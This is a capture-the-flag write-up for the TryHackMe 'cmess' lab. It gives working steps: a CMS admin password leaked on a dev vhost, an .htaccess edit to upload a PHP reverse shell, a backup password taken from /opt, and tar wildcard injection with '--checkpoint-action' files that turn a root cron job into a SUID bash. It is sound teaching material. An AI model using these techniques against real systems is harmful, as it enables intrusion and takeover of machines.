# [cmess](https://tryhackme.com/room/cmess)

> A Linux machine with a development virtual host whose index page reveals the password to the administrator panel of a [Gila CMS](https://gilacms.com/) instance. Access to this panel makes it possible to bypass `.htaccess` restrictions and upload and execute arbitrary PHP code, granting a command shell as `www-data`. Another user's password is stored in a text file readable by `www-data`. A `cron` job is configured that has `root` `tar`ing up all items in a folder in this user's home directory and saving the archive to `/tmp`. This is achieved with a wildcard (`*`) character. This `cron` job can be abused to execute an arbitrary shell script as `root`.

---

## Open Port Enumeration

```bash
$ sudo masscan -p1-65535 10.10.105.69 --rate=1000 -e tun0 --output-format grepable --output-filename enum/cmess.masscan
$ cat enum/cmess.masscan  | grep open | cut -d' ' -f5 | cut -d'/' -f1 | sort -u | tr '\n' ','
22,80, 
```

TCP ports 22 (SSH) and 80 (HTTP) are open. According to [launchpad](https://launchpad.net/ubuntu/+source/openssh/1:7.2p2-4ubuntu2.8) the OpenSSH banner indicates the target's operating system as Ubuntu 16.04 (Xenial).

```bash
$ sudo nmap -sC -sV -O -p22,80 10.10.105.69 -oA enum/cmess
Starting Nmap 7.91 ( https://nmap.org ) at 2022-01-21 17:25 UTC
Nmap scan report for cmess.thm (10.10.105.69)
Host is up (0.080s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 d9:b6:52:d3:93:9a:38:50:b4:23:3b:fd:21:0c:05:1f (RSA)
|   256 21:c3:6e:31:8b:85:22:8a:6d:72:86:8f:ae:64:66:2b (ECDSA)
|_  256 5b:b9:75:78:05:d7:ec:43:30:96:17:ff:c6:a8:6c:ed (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-generator: Gila CMS
| http-robots.txt: 3 disallowed entries
|_/src/ /themes/ /lib/
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.10 - 3.13 (95%), Linux 5.4 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%), Linux 3.16 (95%), Linux 3.1 (93%), Linux 3.2 (93%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (92%), Sony Android TV (Android 5.0) (92%), Android 5.0 - 6.0.1 (Linux 3.4) (92%), Android 7.1.1 - 7.1.2 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.89 seconds
```

---

## Web Application Enumeration

The box's description advises mapping its IP address to `cmess.thm` in the local DNS resolver. Be sure to do so.

The target's port 80 is an Apache web server version 2.4.18 serving [Gila CMS](https://gilacms.com/). It appears to be functioning as a blog, with one post titled "Hello World."

![](images/Pasted%20image%2020220121174619.png)

### `/robots.txt`

There is a `/robots.txt` preventing crawler access to `/src/`, `/themes/`, and `/lib/`.

`/src/` redirects to `/src/url=src`, which returns a 403. The same is true of `/lib/` and `/themes/`.

### Content Discovery

`gobuster` discovers a lot of paths here. The most interesting ones are `/login` and `/admin`, both of which lead to the login form of the Gila CMS administrator panel.

```bash
$ gobuster dir -u http://cmess.thm -w /usr/share/wordlists/raft-small-words.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://cmess.thm
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/raft-small-words.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/01/21 17:50:32 Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 274]
/.php                 (Status: 403) [Size: 274]
/login                (Status: 200) [Size: 1580]
/admin                (Status: 200) [Size: 1580]
/themes               (Status: 301) [Size: 318] [--> http://cmess.thm/themes/?url=themes]
/index                (Status: 200) [Size: 3851]
/tmp                  (Status: 301) [Size: 312] [--> http://cmess.thm/tmp/?url=tmp]
/feed                 (Status: 200) [Size: 735]
/.htm                 (Status: 403) [Size: 274]
/category             (Status: 200) [Size: 3862]
/tag                  (Status: 200) [Size: 3874]
/blog                 (Status: 200) [Size: 3851]
/sites                (Status: 301) [Size: 316] [--> http://cmess.thm/sites/?url=sites]
/search               (Status: 200) [Size: 3851]
/lib                  (Status: 301) [Size: 312] [--> http://cmess.thm/lib/?url=lib]
/author               (Status: 200) [Size: 3590]
/api                  (Status: 200) [Size: 0]
/assets               (Status: 301) [Size: 318] [--> http://cmess.thm/assets/?url=assets]
/tags                 (Status: 200) [Size: 3139]
/about                (Status: 200) [Size: 3353]
/Search               (Status: 200) [Size: 3851]
/1                    (Status: 200) [Size: 4078]
/log                  (Status: 301) [Size: 312] [--> http://cmess.thm/log/?url=log]
/.                    (Status: 200) [Size: 3865]
/0                    (Status: 200) [Size: 3851]
/.htaccess            (Status: 403) [Size: 274]
/src                  (Status: 301) [Size: 312] [--> http://cmess.thm/src/?url=src]
/01                   (Status: 200) [Size: 4078]
/.php3                (Status: 403) [Size: 274]
/.phtml               (Status: 403) [Size: 274]
/fm                   (Status: 200) [Size: 0]
/cm                   (Status: 500) [Size: 0]
/About                (Status: 200) [Size: 3339]
/Index                (Status: 200) [Size: 3851]
/.htc                 (Status: 403) [Size: 274]
/.php5                (Status: 403) [Size: 274]
/Category             (Status: 200) [Size: 3862]
/.html_var_DE         (Status: 403) [Size: 274]
/.php4                (Status: 403) [Size: 274]
/Author               (Status: 200) [Size: 3590]
/server-status        (Status: 403) [Size: 274]
/001                  (Status: 200) [Size: 4078]
/Tags                 (Status: 200) [Size: 3139]
/.htpasswd            (Status: 403) [Size: 274]
/.html.               (Status: 403) [Size: 274]
/Feed                 (Status: 200) [Size: 735]
/.html.html           (Status: 403) [Size: 274]
/.htpasswds           (Status: 403) [Size: 274]
/Tag                  (Status: 200) [Size: 3874]
/.htm.                (Status: 403) [Size: 274]
/0001                 (Status: 200) [Size: 4078]
/.htmll               (Status: 403) [Size: 274]
/.phps                (Status: 403) [Size: 274]
/SEARCH               (Status: 200) [Size: 3851]
/.html.old            (Status: 403) [Size: 274]
/.ht                  (Status: 403) [Size: 274]
/.html.bak            (Status: 403) [Size: 274]
/.htm.htm             (Status: 403) [Size: 274]
/1index               (Status: 200) [Size: 4078]
/ABOUT                (Status: 200) [Size: 3339]
/.hta                 (Status: 403) [Size: 274]
/.htgroup             (Status: 403) [Size: 274]
/.html1               (Status: 403) [Size: 274]
/1c                   (Status: 200) [Size: 4078]
/.html.LCK            (Status: 403) [Size: 274]
/.html.printable      (Status: 403) [Size: 274]
/1b                   (Status: 200) [Size: 4078]
/.htm.LCK             (Status: 403) [Size: 274]
/.htaccess.bak        (Status: 403) [Size: 274]
/.html.php            (Status: 403) [Size: 274]
/.htmls               (Status: 403) [Size: 274]
/.htx                 (Status: 403) [Size: 274]
/1a                   (Status: 200) [Size: 4078]
/1checkout            (Status: 200) [Size: 4078]
/1images              (Status: 200) [Size: 4078]
/1ps                  (Status: 200) [Size: 4078]
/1qaz2wsx             (Status: 200) [Size: 4078]
/1st                  (Status: 200) [Size: 4078]
/1x1                  (Status: 200) [Size: 4078]
/INDEX                (Status: 200) [Size: 3851]
/.htlm                (Status: 403) [Size: 274]
/.htm2                (Status: 403) [Size: 274]
/.htuser              (Status: 403) [Size: 274]
/.html-               (Status: 403) [Size: 274]
/01_02                (Status: 200) [Size: 4078]
/1-1                  (Status: 200) [Size: 4078]
/1-3                  (Status: 200) [Size: 4078]
/1-delivery           (Status: 200) [Size: 4078]
/1-livraison          (Status: 200) [Size: 4078]
/1_0                  (Status: 200) [Size: 4078]
/1_files              (Status: 200) [Size: 4078]
/1_1                  (Status: 200) [Size: 4078]
/1temp                (Status: 200) [Size: 4078]

===============================================================
2022/01/21 17:56:39 Finished
===============================================================
```

### Virtual Host Discovery

Interestingly, all virtual host queries resulted in 200s. Most of the response sizes are around 3000 characters. However, one of the response sizes was significantly smaller than all the others. Use [this gist](https://gist.github.com/tgihf/4c8f510ba18c392aa9a849549a048a8c) to convert the `gobuster vhost` output into JSON objects and then use `jq` to determine the outlier: `dev.cmess.thm`.

```bash
$ gobuster vhost -u http://cmess.thm -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt > gobuster-vhost.out
$ python3 gobuster-vhost-to-json.py --file gobuster-vhost.out | jq '.[] | select(.size < 3000)'
{
  "hostname": "dev.cmess.thm",
  "status": 200,
  "size": 934
}
```

---

## `dev` Virtual Host

Add the virtual host `dev.cmess.thm` to the local DNS resolver and visit it. It contains a "development log" web page consisting of a conversation between `andre@cmess.thm` and `support@cmess.thm` regarding an `.htaccess` misconfiguration. This page also discloses `andre@cmess.thm`'s password to the Gila CMS administrator panel: `KPFTN_f2yxe%`.

![](images/Pasted%20image%2020220121170135.png)

---

## Gila CMS Administrator Panel

Use the credential `andre@cmess.thm`:`KPFTN_f2yxe%` to access the Gila CMS administrator panel at `/admin`.

![](images/Pasted%20image%2020220121170906.png)

**Content** > **File Manager** allows read and write access to all files in the web root.

Note the folder `/tmp`. All it contains is an `.htaccess` file that prevents access to it.

```txt
<Files *.php>
deny from all
</Files>
```

![](images/Pasted%20image%2020220121172805.png)

Through the web application's file editor, it is possible to remove the `deny from all` line. Afterwards, it is possible to browse to `/tmp`.

![](images/Pasted%20image%2020220121172926.png)

Through the web application, click on the `+ File` button to create a new file in `/tmp`. Paste in [Pentest Monkey's PHP reverse shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) and change the IP address and port accordingly. Name the file `tgihf.php` and save it.

![](images/Pasted%20image%2020220121173212.png)

Start a reverse shell listener, browse to `http://cmess.thm/tmp/tgihf.php`, and catch the reverse shell.

```bash
$ sudo nc -nlvp 443
listening on [any] 443 ...
connect to [10.6.31.77] from (UNKNOWN) [10.10.247.238] 47852
Linux cmess 4.4.0-142-generic #168-Ubuntu SMP Wed Jan 16 21:00:45 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 14:32:30 up 10 min,  0 users,  load average: 0.00, 0.10, 0.12
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$
```

---

## `andre`'s Backup Password

After gaining situational awareness on the machine and running through several manual privilege escalation checks, there wasn't anything indicating a path from `www-data` to either of the two users with console access, `andre` or `root`.

Running [LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) as `www-data` reveals an interesting, non-standard backup file: `/opt/.password.bak`. It contains `andre`'s "backup" password, `UQfsdCB7aAP6`.

```bash
www-data@cmess:/dev/shm/tgihf$ cat /opt/.password.bak
andres backup password
UQfsdCB7aAP6
```

---

## `cron` Job Wildcard Privilege Escalation

Use the credential `andre`:`UQfsdCB7aAP6` to accesss the target via SSH. Grab the user flag from `/home/andre/user.txt`.

```bash
$ ssh andre@cmess.thm
andre@cmess.thm's password:
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-142-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
Last login: Thu Feb 13 15:02:43 2020 from 10.0.0.20
andre@cmess:~$ ls
backup  user.txt
```

Enumerating the system's `cron` jobs reveals that `root` is running a job every two minutes that uses `tar` to archive all the files in `/home/andre/backup` to `/tmp/andre_backup.tar.gz`. It contains a wildcard character (`*`), which can be abused to execute a shell script as `root`.

```bash
andre@cmess:~/backup$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
*/2 *   * * *   root    cd /home/andre/backup && tar -zcf /tmp/andre_backup.tar.gz *
```

Write a malicious shell script named `tgihf.sh` in `/home/andre/backup`. Make sure it's executable.

```bash
cp /bin/bash /tmp/bash
chmod +s /tmp/bash
```

Create two files in `/home/andre/backup`: `--checkpoint=1` and `--checkpoint-action=exec=sh tgihf.sh`.

```bash
andre@cmess:~/backup$ touch /home/andre/backup/--checkpoint=1
andre@cmess:~/backup$ touch '/home/andre/backup/--checkpoint-action=exec=sh tgihf.sh'
```

When the `cron` job runs, the wildcard (`*`) passed to `tar` will expand and include the two new files created, effectively invoking the command `cd /home/andre/backup && tar -zcf /tmp/andre_backup.tar.gz note tgihf.sh --checkpoint=1 '--checkpoint-action=exec=sh tgihf.sh'`. The `--checkpoint` and `--checkpoint-action` arguments will cause the execution of `/home/andre/tgihf.sh`, which will create a SUID version of `bash` at `/tmp/bash`.

Wait at most two minutes for the job to run. Run the SUID `bash` to elevate to `root` and grab the system flag.

```bash
andre@cmess:~/backup$ ls /tmp/
andre_backup.tar.gz  bash  systemd-private-adb3a73494624cb3b708047ba64d8343-systemd-timesyncd.service-8zZBwy  VMwareDnD
andre@cmess:~/backup$ /tmp/bash -p
bash-4.3# id
uid=1000(andre) gid=1000(andre) euid=0(root) egid=0(root) groups=0(root),1000(andre)
```
